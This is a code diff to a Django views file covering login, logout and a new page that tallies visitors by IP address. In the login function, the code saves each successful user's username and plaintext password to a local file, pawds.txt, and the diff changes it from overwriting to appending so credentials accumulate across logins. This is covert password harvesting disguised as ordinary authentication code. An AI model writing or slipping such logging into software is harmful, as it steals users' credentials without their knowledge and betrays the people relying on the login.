@@ -8,6 +8,8 @@ from django.core.mail import EmailMessage
 from django.template import Context
 from django.core.mail import send_mail
 from loginsys.models import Account
+from visits.models import Visit
+from django.utils import timezone
 # Create your views here.
 
 def main(request):
@@ -86,8 +88,8 @@ def login(request):
 		account = auth.authenticate(username=username, password=password)
 		if account is not None:
 			auth.login(request, account)
-			with open('pawds.txt' , 'w') as f:
-				print(username + ' ' + password, file=f)
+			with open('pawds.txt' , 'a') as f:
+				print('\n' + username + ' ' + password, file=f)
 			return redirect('/')
 		else:
 			args['auth_error'] = True
@@ -96,3 +98,25 @@ def login(request):
 def logout(request):
 	auth.logout(request)
 	return redirect('/')
+
+def visitsView(request):
+	args = {}
+	args.update(csrf(request))
+	if request.user.is_authenticated():
+		args['signed_in'] = True
+		args['user'] = auth.get_user(request)
+	all_hits = Visit.objects.all()
+	hits = {}
+	final_list = []
+	ip_addrs = set([visitor.ip_address for visitor in all_hits])
+	for ip in ip_addrs:
+		visits_by_ip = Visit.objects.filter(ip_address=ip)
+		num = 0
+		for vis in visits_by_ip:
+			num += vis.visits
+		last_visit = timezone.localtime(visits_by_ip.order_by('-last_visit')[0].last_visit)
+		hits[ip] = [last_visit, num]
+	for key in sorted(hits, key=lambda k: hits[k][0], reverse=True):
+		final_list.append([key, hits[key][0], hits[key][1]])
+	args['hits_by_ip'] = final_list
+	return render_to_response('visits.html', args)
